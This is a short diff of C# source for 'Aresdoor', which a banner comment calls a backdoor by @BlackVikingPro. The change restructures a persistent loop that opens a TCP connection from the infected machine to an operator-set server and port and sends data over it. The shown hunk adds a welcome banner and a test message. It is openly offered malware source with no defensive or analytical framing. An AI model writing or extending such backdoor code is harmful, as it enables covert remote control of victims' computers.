@@ -214,14 +214,24 @@ namespace aresdoor
                     {
                         Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);
 
+                        // Define a couple of variables that set our connection target
+                        TcpClient client = new System.Net.Sockets.TcpClient(server, port);
+                        NetworkStream stream = client.GetStream();
+                        NetworkCommunication nc = new NetworkCommunication();
+
                         // Write in loop for a persistant connection
                         while (true)
                         {
-                            // Define a couple of variables that set our connection target
-                            TcpClient client = new System.Net.Sockets.TcpClient(server, port);
-                            NetworkStream stream = client.GetStream();
+                            string aresdoorStartMenu = string.Empty;
+                            aresdoorStartMenu += "";
 
+                            /*
++-------------------------------------------------------------+
+| Welcome to Aresdoor - a backdoor written by @BlackVikingPro |
+| Current Version: v1.2.1
+                            */
 
+                            nc.dataTravelTO(stream, "Testing...");
                         }
 
                         // sendBackdoor(server, port);
